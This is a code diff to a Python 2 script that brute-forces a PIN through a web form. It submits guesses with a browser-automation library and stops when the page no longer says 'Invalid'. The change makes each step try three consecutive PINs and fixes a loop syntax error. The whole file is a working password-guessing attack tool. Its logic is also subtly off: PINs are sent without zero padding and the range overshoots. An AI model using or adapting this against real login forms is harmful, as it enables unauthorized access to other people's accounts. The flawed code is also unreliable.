@@ -76,12 +76,26 @@ def main(test_num):
     if read.find("Invalid") == -1 :
         return str(test_num)
     else:
-        return 0
+        br.select_form(nr=1)        
+        br.form['pin'] = str(test_num+1)
+        response = br.submit()
+        read = response.read()
+        if read.find("Invalid") == -1 :
+            return str(test_num+1)
+        else:
+            br.select_form(nr=1)        
+            br.form['pin'] = str(test_num+2)
+            response = br.submit()
+            read = response.read()
+            if read.find("Invalid") == -1 :
+                return str(test_num+2)
+            else:
+                return 0
     
 def brute_crack():
-    for i in range(9999)):
+    for i in range(9999):
         
-        worked = main(i+0000)
+        worked = main(i*3+0000)
         if worked != 0:
             print worked
             break
